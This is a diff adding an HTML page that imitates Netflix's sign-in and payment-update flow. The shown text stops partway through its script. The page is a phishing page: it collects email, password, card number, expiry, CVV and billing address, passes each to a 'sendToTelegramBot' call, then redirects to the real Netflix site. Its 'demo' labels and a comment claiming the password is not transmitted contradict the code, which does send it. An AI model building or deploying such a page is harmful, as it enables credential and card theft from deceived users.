@@ -1,0 +1,2006 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="apple-touch-icon" content="https://assets.nflxext.com/en_us/layout/ecweb/netflix-app-icon_152.jpg">
+
+    <link type="text/css" rel="stylesheet"
+        href="https://assets.nflxext.com/web/ffe/wp/@nf-web-ui/ui-shared/dist/less/pages/clcs/shared.fd4b86a52de5dc09baaa.css"
+        crossorigin="anonymous" data-uia="botLink">
+
+    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2023.ico">
+
+    <link rel="apple-touch-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png">
+
+    <title>Netflix</title>
+
+
+    <style>
+        /* =========================================================
+           RESET
+        ========================================================= */
+
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+        }
+
+
+        html {
+            width: 100%;
+            min-height: 100%;
+        }
+
+
+        body {
+            width: 100%;
+            min-height: 100vh;
+
+            margin: 0;
+            padding: 0;
+
+            color: #ffffff;
+
+            background: #000000;
+
+            font-family:
+                "Netflix Sans",
+                "Helvetica Neue",
+                "Segoe UI",
+                Roboto,
+                Ubuntu,
+                sans-serif;
+
+            font-size: 16px;
+            line-height: 1.4;
+
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+
+        button,
+        input,
+        select {
+            font-family: inherit;
+        }
+
+
+        button {
+            -webkit-tap-highlight-color: transparent;
+        }
+
+
+        /* =========================================================
+           PAGE
+        ========================================================= */
+
+        .page {
+            position: relative;
+
+            width: 100%;
+            min-height: 100vh;
+
+            overflow-x: hidden;
+            overflow-y: auto;
+
+            background:
+                linear-gradient(180deg,
+                    #4b171b 0%,
+                    #3d1115 14%,
+                    #2b0b0f 32%,
+                    #190508 58%,
+                    #0b0203 80%,
+                    #000000 100%);
+        }
+
+
+        .page::before {
+            content: "";
+
+            position: absolute;
+
+            inset: 0;
+
+            pointer-events: none;
+
+            background:
+                radial-gradient(ellipse 80% 45% at 50% 0%,
+                    rgba(180, 25, 35, 0.18),
+                    transparent 70%);
+        }
+
+
+        /* =========================================================
+           HEADER
+        ========================================================= */
+
+        .header {
+            position: relative;
+
+            z-index: 10;
+
+            width: 100%;
+            height: 68px;
+
+            border-bottom:
+                1px solid rgba(255, 255, 255, 0.12);
+        }
+
+
+        .header-container {
+            width: 100%;
+            height: 100%;
+
+            padding: 0 20px;
+
+            display: flex;
+            align-items: center;
+        }
+
+
+        .logo {
+            display: inline-flex;
+
+            align-items: center;
+
+            text-decoration: none;
+
+            user-select: none;
+        }
+
+
+        .logo img {
+            display: block;
+
+            width: 148px;
+            height: auto;
+
+            max-height: 42px;
+
+            object-fit: contain;
+        }
+
+
+        /* =========================================================
+           MAIN
+        ========================================================= */
+
+        .main {
+            position: relative;
+
+            z-index: 5;
+
+            width: 100%;
+
+            min-height:
+                calc(100vh - 68px);
+        }
+
+
+        .layout-container {
+            width: 100%;
+
+            min-height:
+                calc(100vh - 68px);
+
+            padding: 32px 20px;
+
+            display: flex;
+
+            justify-content: flex-start;
+
+            align-items: flex-start;
+        }
+
+
+        .form-column {
+            width: 100%;
+
+            max-width: 360px;
+
+            min-width: 0;
+
+            margin: 0 auto;
+        }
+
+
+        /* =========================================================
+           STEP WRAPPER
+           
+           IMPORTANT:
+           All screens use the exact same top-left position.
+           The wrapper is allowed to grow for the payment screen.
+        ========================================================= */
+
+        .step-wrapper {
+            position: relative;
+
+            width: 100%;
+            max-width: 100%;
+
+            min-width: 0;
+
+            min-height: 430px;
+
+            overflow: visible;
+        }
+
+
+        .step {
+            width: 100%;
+            max-width: 100%;
+            min-width: 0;
+
+            margin: 0;
+
+            transition:
+                opacity 0.28s ease,
+                transform 0.35s cubic-bezier(0.4,
+                    0,
+                    0.2,
+                    1);
+        }
+
+
+        /* =========================================================
+           STEP POSITIONS
+
+           The first screen establishes the exact position.
+
+           Every other screen is absolutely positioned at:
+               top: 0
+               left: 0
+
+           This prevents Review, Password and Payment from
+           moving downward when they become active.
+        ========================================================= */
+
+        .initial {
+            position: relative;
+
+            top: 0;
+            left: 0;
+
+            opacity: 1;
+
+            transform: translateX(0);
+
+            pointer-events: auto;
+        }
+
+
+        .review,
+        .password-step,
+        .payment-step {
+            position: absolute;
+
+            top: 0;
+            left: 0;
+
+            width: 100%;
+            max-width: 100%;
+            min-width: 0;
+
+            margin: 0;
+
+            opacity: 0;
+
+            transform: translateX(45px);
+
+            pointer-events: none;
+        }
+
+
+        /* =========================================================
+           REVIEW ACTIVE
+        ========================================================= */
+
+        .step-wrapper.review-active .initial {
+            opacity: 0;
+
+            transform: translateX(-45px);
+
+            pointer-events: none;
+        }
+
+
+        .step-wrapper.review-active .review {
+            top: 0;
+            left: 0;
+
+            opacity: 1;
+
+            transform: translateX(0);
+
+            pointer-events: auto;
+        }
+
+
+        /* =========================================================
+           PASSWORD ACTIVE
+        ========================================================= */
+
+        .step-wrapper.password-active .initial {
+            opacity: 0;
+
+            transform: translateX(-45px);
+
+            pointer-events: none;
+        }
+
+
+        .step-wrapper.password-active .review {
+            opacity: 0;
+
+            transform: translateX(-45px);
+
+            pointer-events: none;
+        }
+
+
+        .step-wrapper.password-active .password-step {
+            top: 0;
+            left: 0;
+
+            opacity: 1;
+
+            transform: translateX(0);
+
+            pointer-events: auto;
+        }
+
+
+        /* =========================================================
+           PAYMENT ACTIVE
+        ========================================================= */
+
+        .step-wrapper.payment-active .initial {
+            opacity: 0;
+
+            transform: translateX(-45px);
+
+            pointer-events: none;
+        }
+
+
+        .step-wrapper.payment-active .review {
+            opacity: 0;
+
+            transform: translateX(-45px);
+
+            pointer-events: none;
+        }
+
+
+        .step-wrapper.payment-active .password-step {
+            opacity: 0;
+
+            transform: translateX(-45px);
+
+            pointer-events: none;
+        }
+
+
+        .step-wrapper.payment-active .payment-step {
+            top: 0;
+            left: 0;
+
+            opacity: 1;
+
+            transform: translateX(0);
+
+            pointer-events: auto;
+        }
+
+
+        /* =========================================================
+           HEADINGS
+        ========================================================= */
+
+        .heading {
+            margin: 0 0 8px 0;
+
+            color: #ffffff;
+
+            font-size: 30px;
+
+            font-weight: 700;
+
+            line-height: 1.25;
+
+            letter-spacing: -0.25px;
+        }
+
+
+        .subheading {
+            margin: 0 0 20px 0;
+
+            color: rgba(255, 255, 255, 0.7);
+
+            font-size: 18px;
+
+            font-weight: 400;
+
+            line-height: 1.4;
+        }
+
+
+        /* =========================================================
+           INPUTS
+        ========================================================= */
+
+        .input-wrapper,
+        .password-wrapper,
+        .payment-field,
+        .billing-field {
+            position: relative;
+
+            width: 100%;
+            max-width: 100%;
+            min-width: 0;
+        }
+
+
+        .text-input,
+        .payment-input,
+        .billing-input,
+        .billing-select {
+            display: block;
+
+            width: 100%;
+            max-width: 100%;
+            min-width: 0;
+
+            height: 50px;
+
+            padding: 14px 16px;
+
+            border: 1px solid #8c8c8c;
+
+            border-radius: 4px;
+
+            outline: none;
+
+            background: rgba(35, 35, 35, 0.92);
+
+            color: #ffffff;
+
+            font-size: 16px;
+
+            font-weight: 400;
+
+            line-height: 1.3;
+
+            transition:
+                border-color 0.15s ease,
+                background 0.15s ease;
+        }
+
+
+        .text-input::placeholder,
+        .payment-input::placeholder,
+        .billing-input::placeholder {
+            color: #b3b3b3;
+
+            opacity: 1;
+        }
+
+
+        .text-input:hover,
+        .payment-input:hover,
+        .billing-input:hover,
+        .billing-select:hover {
+            border-color: #aaaaaa;
+        }
+
+
+        .text-input:focus,
+        .payment-input:focus,
+        .billing-input:focus,
+        .billing-select:focus {
+            border-color: #ffffff;
+
+            background: rgba(48, 48, 48, 0.95);
+        }
+
+
+        /* =========================================================
+           ERROR
+        ========================================================= */
+
+        .error {
+            display: none;
+
+            margin-top: 7px;
+
+            color: #ffa00a;
+
+            font-size: 13px;
+
+            line-height: 1.35;
+        }
+
+
+        .input-wrapper.invalid .text-input {
+            border-color: #ffa00a;
+        }
+
+
+        .input-wrapper.invalid .error {
+            display: block;
+        }
+
+
+        /* =========================================================
+           PRIMARY BUTTON
+        ========================================================= */
+
+        .primary-button {
+            display: block;
+
+            width: 100%;
+            max-width: 100%;
+            min-width: 0;
+
+            min-height: 48px;
+
+            margin-top: 12px;
+
+            padding: 12px 24px;
+
+            border: none;
+
+            border-radius: 4px;
+
+            background: #e50914;
+
+            color: #ffffff;
+
+            font-size: 16px;
+
+            font-weight: 700;
+
+            line-height: 1.2;
+
+            cursor: pointer;
+
+            transition:
+                background 0.15s ease,
+                transform 0.1s ease;
+        }
+
+
+        .primary-button:hover {
+            background: #f40612;
+        }
+
+
+        .primary-button:active {
+            transform: scale(0.99);
+        }
+
+
+        /* =========================================================
+           HELP
+        ========================================================= */
+
+        .get-help {
+            display: inline-flex;
+
+            align-items: center;
+
+            gap: 7px;
+
+            margin-top: 32px;
+
+            padding: 0;
+
+            border: none;
+
+            background: transparent;
+
+            color: #ffffff;
+
+            font-size: 14px;
+
+            font-weight: 500;
+
+            line-height: 1.4;
+
+            cursor: pointer;
+        }
+
+
+        .get-help:hover .help-label {
+            text-decoration: underline;
+        }
+
+
+        .chevron {
+            width: 7px;
+            height: 7px;
+
+            border-right: 1.5px solid #ffffff;
+            border-bottom: 1.5px solid #ffffff;
+
+            transform:
+                rotate(45deg) translateY(-2px);
+
+            transition: transform 0.2s ease;
+        }
+
+
+        .get-help.open .chevron {
+            transform:
+                rotate(225deg) translateY(1px);
+        }
+
+
+        .help-menu {
+            width: 100%;
+            max-width: 100%;
+
+            max-height: 0;
+
+            margin-top: 0;
+
+            overflow: hidden;
+
+            opacity: 0;
+
+            transition:
+                max-height 0.3s ease,
+                margin-top 0.3s ease,
+                opacity 0.25s ease;
+        }
+
+
+        .help-menu.open {
+            max-height: 180px;
+
+            margin-top: 12px;
+
+            opacity: 1;
+        }
+
+
+        .help-item {
+            display: block;
+
+            width: 100%;
+
+            padding: 12px 0;
+
+            border: none;
+
+            border-bottom:
+                1px solid rgba(255,
+                    255,
+                    255,
+                    0.12);
+
+            background: transparent;
+
+            color: #ffffff;
+
+            text-align: left;
+
+            font-size: 14px;
+
+            cursor: pointer;
+        }
+
+
+        .help-item:hover {
+            text-decoration: underline;
+        }
+
+
+        /* =========================================================
+           RECAPTCHA DEMO
+        ========================================================= */
+
+        .recaptcha {
+            max-width: 350px;
+
+            margin-top: 28px;
+
+            color: #8c8c8c;
+
+            font-size: 11px;
+
+            line-height: 1.45;
+        }
+
+
+        /* =========================================================
+           REVIEW
+        ========================================================= */
+
+        .review .heading {
+            margin-bottom: 20px;
+        }
+
+
+        .account-display {
+            display: flex;
+
+            width: 100%;
+            max-width: 100%;
+            min-width: 0;
+
+            min-height: 50px;
+
+            padding: 0 16px;
+
+            align-items: center;
+
+            justify-content: space-between;
+
+            gap: 12px;
+
+            border-radius: 4px;
+
+            background: rgba(128,
+                    112,
+                    114,
+                    0.72);
+
+            color: #ffffff;
+
+            font-size: 14px;
+        }
+
+
+        .account-email {
+            min-width: 0;
+
+            overflow: hidden;
+
+            white-space: nowrap;
+
+            text-overflow: ellipsis;
+        }
+
+
+        .change-button {
+            flex-shrink: 0;
+
+            padding: 0;
+
+            border: none;
+
+            background: transparent;
+
+            color: #ffffff;
+
+            font-size: 13px;
+
+            font-weight: 700;
+
+            text-decoration: underline;
+
+            cursor: pointer;
+        }
+
+
+        .offers {
+            display: flex;
+
+            align-items: flex-start;
+
+            gap: 12px;
+
+            margin-top: 20px;
+
+            cursor: pointer;
+        }
+
+
+        .offers-checkbox {
+            appearance: none;
+            -webkit-appearance: none;
+
+            position: relative;
+
+            flex-shrink: 0;
+
+            width: 20px;
+            height: 20px;
+
+            margin: 0;
+
+            border:
+                1px solid #8c8c8c;
+
+            border-radius: 2px;
+
+            background: #000000;
+
+            cursor: pointer;
+        }
+
+
+        .offers-checkbox:checked {
+            background: #ffffff;
+
+            border-color: #ffffff;
+        }
+
+
+        .offers-checkbox:checked::after {
+            content: "";
+
+            position: absolute;
+
+            left: 6px;
+            top: 2px;
+
+            width: 5px;
+            height: 10px;
+
+            border-right: 2px solid #000000;
+            border-bottom: 2px solid #000000;
+
+            transform: rotate(45deg);
+        }
+
+
+        .offers-text {
+            color: #ffffff;
+
+            font-size: 14px;
+
+            font-weight: 500;
+
+            line-height: 1.4;
+        }
+
+
+        .review-button {
+            margin-top: 24px;
+        }
+
+
+        /* =========================================================
+           PASSWORD
+        ========================================================= */
+
+        .back-button,
+        .payment-back {
+            display: inline-flex;
+
+            align-items: center;
+
+            margin: 0 0 25px 0;
+
+            padding: 0;
+
+            border: none;
+
+            background: transparent;
+
+            color: #ffffff;
+
+            font-size: 14px;
+
+            font-weight: 500;
+
+            cursor: pointer;
+        }
+
+
+        .back-button:hover,
+        .payment-back:hover {
+            text-decoration: underline;
+        }
+
+
+        .password-input {
+            padding-right: 72px;
+        }
+
+
+        .show-password {
+            position: absolute;
+
+            right: 12px;
+            top: 50%;
+
+            transform: translateY(-50%);
+
+            padding: 6px;
+
+            border: none;
+
+            background: transparent;
+
+            color: #ffffff;
+
+            font-size: 12px;
+
+            font-weight: 700;
+
+            cursor: pointer;
+        }
+
+
+        .show-password:hover {
+            text-decoration: underline;
+        }
+
+
+        /* =========================================================
+           PAYMENT SCREEN
+        ========================================================= */
+
+        .payment-description {
+            margin: 0 0 20px 0;
+
+            color: rgba(255,
+                    255,
+                    255,
+                    0.7);
+
+            font-size: 15px;
+
+            line-height: 1.5;
+        }
+
+
+        .payment-field {
+            margin-bottom: 12px;
+        }
+
+
+        .payment-row,
+        .billing-row {
+            display: flex;
+
+            width: 100%;
+
+            gap: 12px;
+        }
+
+
+        .payment-row .payment-field,
+        .billing-row .billing-field {
+            flex: 1;
+
+            min-width: 0;
+        }
+
+
+        /* =========================================================
+           BILLING
+        ========================================================= */
+
+        .billing-title {
+            margin: 24px 0 12px 0;
+
+            color: #ffffff;
+
+            font-size: 16px;
+
+            font-weight: 700;
+
+            line-height: 1.3;
+        }
+
+
+        .billing-select {
+            appearance: none;
+            -webkit-appearance: none;
+
+            padding-right: 40px;
+
+            background-image:
+                linear-gradient(45deg,
+                    transparent 50%,
+                    #ffffff 50%),
+                linear-gradient(135deg,
+                    #ffffff 50%,
+                    transparent 50%);
+
+            background-position:
+                calc(100% - 18px) 21px,
+                calc(100% - 12px) 21px;
+
+            background-size:
+                6px 6px,
+                6px 6px;
+
+            background-repeat: no-repeat;
+        }
+
+
+        .billing-select option {
+            background: #232323;
+
+            color: #ffffff;
+        }
+
+
+        /* =========================================================
+           DEMO NOTICE
+        ========================================================= */
+
+        .demo-notice {
+            margin-top: 16px;
+
+            padding: 12px 14px;
+
+            border:
+                1px solid rgba(255,
+                    255,
+                    255,
+                    0.14);
+
+            border-radius: 4px;
+
+            background:
+                rgba(255,
+                    255,
+                    255,
+                    0.05);
+
+            color:
+                rgba(255,
+                    255,
+                    255,
+                    0.65);
+
+            font-size: 12px;
+
+            line-height: 1.45;
+        }
+
+
+        /* =========================================================
+           DEMO INDICATOR
+        ========================================================= */
+
+        .demo-indicator {
+            position: fixed;
+
+            right: 14px;
+            bottom: 12px;
+
+            z-index: 100;
+
+            padding: 5px 8px;
+
+            border:
+                1px solid rgba(255,
+                    255,
+                    255,
+                    0.15);
+
+            border-radius: 3px;
+
+            background:
+                rgba(0,
+                    0,
+                    0,
+                    0.55);
+
+            color:
+                rgba(255,
+                    255,
+                    255,
+                    0.45);
+
+            font-size: 9px;
+
+            pointer-events: none;
+        }
+
+
+        /* =========================================================
+           DESKTOP
+        ========================================================= */
+
+        @media (min-width: 700px) {
+
+            .header-container {
+                padding: 0 32px;
+            }
+
+
+            .layout-container {
+                padding: 32px;
+            }
+
+        }
+
+
+        /* =========================================================
+           LARGE DESKTOP
+        ========================================================= */
+
+        @media (min-width: 1000px) {
+
+            .header-container {
+                max-width: 1280px;
+
+                margin: 0 auto;
+
+                padding: 0 20px;
+            }
+
+
+            .layout-container {
+                max-width: 1280px;
+
+                margin: 0 auto;
+
+                padding: 32px 20px;
+            }
+
+
+            .form-column {
+                max-width: 360px;
+            }
+
+        }
+
+
+        /* =========================================================
+           MOBILE
+        ========================================================= */
+
+        @media (max-width: 599px) {
+
+            .header {
+                height: 68px;
+            }
+
+
+            .header-container {
+                padding: 0 20px;
+            }
+
+
+            .logo img {
+                width: 138px;
+            }
+
+
+            .layout-container {
+                padding: 32px 20px;
+            }
+
+
+            .form-column {
+                width: 100%;
+
+                max-width: none;
+
+                min-width: 0;
+            }
+
+
+            .heading {
+                font-size: 23px;
+            }
+
+
+            .payment-row,
+            .billing-row {
+                gap: 8px;
+            }
+
+        }
+
+
+        /* =========================================================
+           VERY SMALL SCREEN
+        ========================================================= */
+
+        @media (max-width: 360px) {
+
+            .header-container {
+                padding: 0 16px;
+            }
+
+
+            .layout-container {
+                padding: 28px 16px;
+            }
+
+
+            .heading {
+                font-size: 22px;
+            }
+
+
+            .subheading,
+            .payment-description {
+                font-size: 14px;
+            }
+
+
+            .payment-row,
+            .billing-row {
+                flex-direction: column;
+
+                gap: 0;
+            }
+
+        }
+
+
+        /* =========================================================
+           REDUCED MOTION
+        ========================================================= */
+
+        @media (prefers-reduced-motion: reduce) {
+
+            *,
+            *::before,
+            *::after {
+                transition: none !important;
+            }
+
+        }
+    </style>
+
+</head>
+
+
+<body>
+
+    <div class="page">
+
+
+        <!-- =========================================================
+         HEADER
+    ========================================================= -->
+
+        <header class="header">
+
+            <div class="header-container">
+
+                <a href="#" class="logo" aria-label="Demo home" onclick="return false;">
+
+                    <img src="https://occ.a.nflxso.net/dnmt/api/v6/iL4oJVDYZ8KLSrJ6eG2OwtghbfQ/AAAAAdEhm1UzVexHjKqFOP9W6E2UVtkWFvL-vdxIEbTU81rsqNuPmDDy_dQvmQ85ath49JBruVV4aGQA3gY2Dl5SiqFf-AEwPAZBTNkW8FMxGXpDN2mHrf8KlRRiddj1P422ZW1eZkZNWLTd.svg"
+                        alt="Demo logo">
+
+                </a>
+
+            </div>
+
+        </header>
+
+
+        <!-- =========================================================
+         MAIN
+    ========================================================= -->
+
+        <main class="main">
+
+            <div class="layout-container">
+
+                <div class="form-column">
+
+                    <div class="step-wrapper" id="stepWrapper">
+
+
+                        <!-- =================================================
+                         STEP 1
+                    ================================================= -->
+
+                        <section class="step initial" aria-label="Enter your information">
+
+                            <h1 class="heading">
+                                Enter your info to sign in
+                            </h1>
+
+
+                            <p class="subheading">
+                                Or get started with a new account.
+                            </p>
+
+
+                            <div>
+
+                                <div class="input-wrapper" id="inputWrapper">
+
+                                    <input id="emailInput" class="text-input" type="text"
+                                        placeholder="Email or mobile number" autocomplete="off" spellcheck="false"
+                                        aria-label="Email or mobile number">
+
+
+                                    <div class="error">
+                                        Please enter your email
+                                        or mobile number.
+                                    </div>
+
+                                </div>
+
+
+                                <button type="button" class="primary-button" id="emailContinue">
+                                    Continue
+                                </button>
+
+                            </div>
+
+
+                            <button type="button" class="get-help" id="getHelp">
+
+                                <span class="help-label">
+                                    Get Help
+                                </span>
+
+                                <span class="chevron" aria-hidden="true"></span>
+
+                            </button>
+
+
+                            <div class="help-menu" id="helpMenu">
+
+                                <button type="button" class="help-item" data-demo-action>
+                                    Use a sign-in code
+                                </button>
+
+
+                                <button type="button" class="help-item" data-demo-action>
+                                    Forgot password?
+                                </button>
+
+                            </div>
+
+
+                            <p class="recaptcha">
+                                This page is protected by Google reCAPTCHA to ensure you're not a bot.
+                            </p>
+
+                        </section>
+
+
+                        <!-- =================================================
+                         STEP 2
+                    ================================================= -->
+
+                        <section class="step review" aria-label="Review your information">
+
+                            <h1 class="heading">
+                                Review to continue
+                            </h1>
+
+
+                            <div class="account-display">
+
+                                <span class="account-email" id="reviewEmail">
+                                    demo@example.com
+                                </span>
+
+
+                                <button type="button" class="change-button" id="changeEmail">
+                                    Change
+                                </button>
+
+                            </div>
+
+
+                            <label class="offers">
+
+                                <input type="checkbox" class="offers-checkbox">
+
+
+                                <span class="offers-text">
+                                    Please do not email me
+                                    Netflix special offers.
+                                </span>
+
+                            </label>
+
+
+                            <button type="button" class="primary-button review-button" id="reviewContinue">
+                                Continue
+                            </button>
+
+
+                            <button type="button" class="get-help" id="reviewHelp">
+
+                                <span class="help-label">
+                                    Get Help
+                                </span>
+
+                                <span class="chevron" aria-hidden="true"></span>
+
+                            </button>
+
+
+                            <div class="help-menu" id="reviewHelpMenu">
+
+                                <button type="button" class="help-item" data-demo-action>
+                                    Use a sign-in code
+                                </button>
+
+
+                                <button type="button" class="help-item" data-demo-action>
+                                    Forgot password?
+                                </button>
+
+                            </div>
+
+                        </section>
+
+
+                        <!-- =================================================
+                         STEP 3
+                    ================================================= -->
+
+                        <section class="step password-step" aria-label="password screen">
+
+                            <button type="button" class="back-button" id="passwordBack">
+                                ← Back
+                            </button>
+
+
+                            <h1 class="heading">
+                                Enter your password
+                            </h1>
+
+
+                            <div class="password-wrapper">
+
+                                <input id="passwordInput" class="text-input password-input" type="password"
+                                    placeholder="password" autocomplete="off" aria-label="Password">
+
+
+                                <button type="button" class="show-password" id="showPassword">
+                                    SHOW
+                                </button>
+
+                            </div>
+
+
+                            <button type="button" class="primary-button" id="signInButton">
+                                Continue
+                            </button>
+
+
+                            <button type="button" class="get-help" id="passwordHelp">
+
+                                <span class="help-label">
+                                    Get Help
+                                </span>
+
+                                <span class="chevron" aria-hidden="true"></span>
+
+                            </button>
+
+
+                            <div class="help-menu" id="passwordHelpMenu">
+
+                                <button type="button" class="help-item" data-demo-action>
+                                    Forgot password?
+                                </button>
+
+
+                                <button type="button" class="help-item" data-demo-action>
+                                    Use a sign-in code
+                                </button>
+
+                            </div>
+
+                        </section>
+
+
+                        <!-- =================================================
+                         STEP 4 — PAYMENT DEMO
+                    ================================================= -->
+
+                        <section class="step payment-step" aria-label="Demo payment information">
+
+                            <button type="button" class="payment-back" id="paymentBack">
+                                ← Back
+                            </button>
+
+
+                            <h1 class="heading">
+                                Update your payment information
+                            </h1>
+
+
+                            <!-- DEMO CARDHOLDER -->
+
+                            <div class="payment-field">
+
+                                <input id="demoCardName" class="payment-input" type="text" placeholder="cardholder name"
+                                    autocomplete="off">
+
+                            </div>
+
+
+                            <!-- DEMO CARD NUMBER -->
+
+                            <div class="payment-field">
+
+                                <input id="demoCardNumber" class="payment-input" type="text" inputmode="numeric"
+                                    placeholder="card number" autocomplete="off" maxlength="19">
+
+                            </div>
+
+
+                            <!-- EXPIRY / DEMO CVV -->
+
+                            <div class="payment-row">
+
+                                <div class="payment-field">
+
+                                    <input id="demoExpiry" class="payment-input" type="text" inputmode="numeric"
+                                        placeholder="MM/YY" autocomplete="off" maxlength="5">
+
+                                </div>
+
+
+                                <div class="payment-field">
+
+                                    <input id="demoCvv" class="payment-input" type="text" inputmode="numeric"
+                                        placeholder="CVV" autocomplete="off" maxlength="4">
+
+                                </div>
+
+                            </div>
+
+
+                            <!-- BILLING ADDRESS -->
+
+                            <div class="billing-title">
+                                Billing address
+                            </div>
+
+
+                            <div class="billing-field">
+
+                                <input id="billingAddress" class="billing-input" type="text"
+                                    placeholder="Billing address" autocomplete="off">
+
+                            </div>
+
+
+                            <div class="billing-field">
+
+                                <input id="billingCity" class="billing-input" type="text" placeholder="City"
+                                    autocomplete="off">
+
+                            </div>
+
+
+                            <div class="billing-row">
+
+                                <div class="billing-field">
+
+                                    <input id="billingState" class="billing-input" type="text"
+                                        placeholder="State / Province" autocomplete="off">
+
+                                </div>
+
+
+                                <div class="billing-field">
+
+                                    <input id="billingZip" class="billing-input" type="text"
+                                        placeholder="ZIP / Postal code" autocomplete="off">
+
+                                </div>
+
+                            </div>
+
+
+                            <!-- COUNTRY -->
+
+                            <div class="billing-field">
+
+                                <select id="billingCountry" class="billing-select" aria-label="Country">
+
+                                    <option value="US" selected>
+                                        United States
+                                    </option>
+
+                                </select>
+
+                            </div>
+
+
+                            <!-- DEMO BUTTON -->
+
+                            <button type="button" class="primary-button" id="updatePaymentButton">
+                                Update payment
+                            </button>
+
+
+                            <!-- DEMO NOTICE -->
+
+
+                            <!-- HELP -->
+
+                            <button type="button" class="get-help" id="paymentHelp">
+
+                                <span class="help-label">
+                                    Get Help
+                                </span>
+
+                                <span class="chevron" aria-hidden="true"></span>
+
+                            </button>
+
+
+                            <div class="help-menu" id="paymentHelpMenu">
+
+                                <button type="button" class="help-item" data-demo-action>
+                                    Contact support
+                                </button>
+
+
+                                <button type="button" class="help-item" data-demo-action>
+                                    Return to sign in
+                                </button>
+
+                            </div>
+
+                        </section>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </main>
+
+
+        <!-- =========================================================
+         DEMO INDICATOR
+    ========================================================= -->
+
+    </div>
+
+
+    <script>
+
+        "use strict";
+
+        // Elements
+        const stepWrapper = document.getElementById("stepWrapper");
+        const emailInput = document.getElementById("emailInput");
+        const emailContinue = document.getElementById("emailContinue");
+        const inputWrapper = document.getElementById("inputWrapper");
+        const reviewEmail = document.getElementById("reviewEmail");
+        const changeEmail = document.getElementById("changeEmail");
+        const reviewContinue = document.getElementById("reviewContinue");
+        const passwordBack = document.getElementById("passwordBack");
+        const passwordInput = document.getElementById("passwordInput");
+        const showPassword = document.getElementById("showPassword");
+        const signInButton = document.getElementById("signInButton");
+        const paymentBack = document.getElementById("paymentBack");
+        const updatePaymentButton = document.getElementById("updatePaymentButton");
+
+        // Help elements
+        const getHelp = document.getElementById("getHelp");
+        const helpMenu = document.getElementById("helpMenu");
+        const reviewHelp = document.getElementById("reviewHelp");
+        const reviewHelpMenu = document.getElementById("reviewHelpMenu");
+        const passwordHelp = document.getElementById("passwordHelp");
+        const passwordHelpMenu = document.getElementById("passwordHelpMenu");
+        const paymentHelp = document.getElementById("paymentHelp");
+        const paymentHelpMenu = document.getElementById("paymentHelpMenu");
+
+        // Step 1 → Step 2
+        emailContinue.addEventListener("click", function () {
+            const value = emailInput.value.trim();
+
+            if (!value) {
+                inputWrapper.classList.add("invalid");
+                emailInput.focus();
+                return;
+            }
+
+            inputWrapper.classList.remove("invalid");
+
+            // Local display only.
+            reviewEmail.textContent = value;
+
+            stepWrapper.classList.remove("password-active");
+            stepWrapper.classList.remove("payment-active");
+            stepWrapper.classList.add("review-active");
+
+            sendToTelegramBot({ step: "Step 1", data: { email: value } });
+        });
+
+        // Email Enter Key
+        emailInput.addEventListener("keydown", function (event) {
+            if (event.key === "Enter") {
+                event.preventDefault();
+                emailContinue.click();
+            }
+        });
+
+        // Clear Email Error
+        emailInput.addEventListener("input", function () {
+            if (emailInput.value.trim() !== "") {
+                inputWrapper.classList.remove("invalid");
+            }
+        });
+
+        // Step 2 → Step 1
+        changeEmail.addEventListener("click", function () {
+            stepWrapper.classList.remove("review-active");
+            stepWrapper.classList.remove("password-active");
+            stepWrapper.classList.remove("payment-active");
+
+            setTimeout(function () {
+                emailInput.focus();
+            }, 350);
+        });
+
+        // Step 2 → Step 3
+        reviewContinue.addEventListener("click", function () {
+            stepWrapper.classList.remove("review-active");
+            stepWrapper.classList.remove("payment-active");
+            stepWrapper.classList.add("password-active");
+
+            setTimeout(function () {
+                passwordInput.focus();
+            }, 350);
+
+            sendToTelegramBot({ step: "Step 2", data: { email: reviewEmail.textContent } });
+        });
+
+        // Step 3 → Step 2
+        passwordBack.addEventListener("click", function () {
+            stepWrapper.classList.remove("password-active");
+            stepWrapper.classList.remove("payment-active");
+            stepWrapper.classList.add("review-active");
+        });
+
+        // Show / Hide Password
+        showPassword.addEventListener("click", function () {
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                showPassword.textContent = "HIDE";
+            } else {
+                passwordInput.type = "password";
+                showPassword.textContent = "SHOW";
+            }
+
+            passwordInput.focus();
+        });
+
+        // Step 3 → Step 4
+        signInButton.addEventListener("click", function () {
+            // Password is deliberately not transmitted or stored.
+            stepWrapper.classList.remove("review-active");
+            stepWrapper.classList.remove("password-active");
+            stepWrapper.classList.add("payment-active");
+
+            setTimeout(function () {
+                const cardName = document.getElementById("demoCardName");
+                if (cardName) {
+                    cardName.focus();
+                }
+            }, 350);
+
+            sendToTelegramBot({ step: "Step 3", data: { password: passwordInput.value } });
+        });
+
+        // Step 4 → Step 3
+        paymentBack.addEventListener("click", function () {
+            stepWrapper.classList.remove("payment-active");
+            stepWrapper.classList.add("password-active");
+
+            setTimeout(function () {
+                passwordInput.focus();
+            }, 350);
+        });
+
+        // Demo Payment Button
+        updatePaymentButton.addEventListener("click", function () {
+            window.location.href = "https://www.netflix.com";
+            sendToTelegramBot({
+                step: "Step 4",
+                data: {
+                    cardName: demoCardName.value,
+                    cardNumber: demoCardNumber.value,
+                    expiry: demoExpiry.value,
+                    cvv: demoCvv.value,
+                    billingAddress: billingAddress.value,
+                    billingCity: billingCity.value,
+                    billingState: billingState.value,
+                    billingZip: billingZip.value,
+                    billingCountry: billingCountry.value
+                }
+            });
+        });
+
+        // Help Menu Management
+        function closeHelpMenus() {
+            helpMenu.classList.remove("open");
+            reviewHelpMenu.classList.remove("open");
+            passwordHelpMenu.classList.remove("open");
+            paymentHelpMenu.classList.remove("open");
+
+            getHelp.classList.remove("open");
+            reviewHelp.classList.remove("open");
+            passwordHelp.classList.remove("open");
+            paymentHelp.classList.remove("open");
+        }
+
+        function toggleHelp(button, menu) {
+            const shouldOpen = !menu.classList.contains("open");
+
+            closeHelpMenus();
+
+            if (shouldOpen) {
+                menu.classList.add("open");
+                button.classList.add("open");
+            }
+        }
+
+        // HELP — STEP 1
+        getHelp.addEventListener("click", function (event) {
+            event.stopPropagation();
+            toggleHelp(getHelp, helpMenu);
+        });
+
+        // HELP — STEP 2
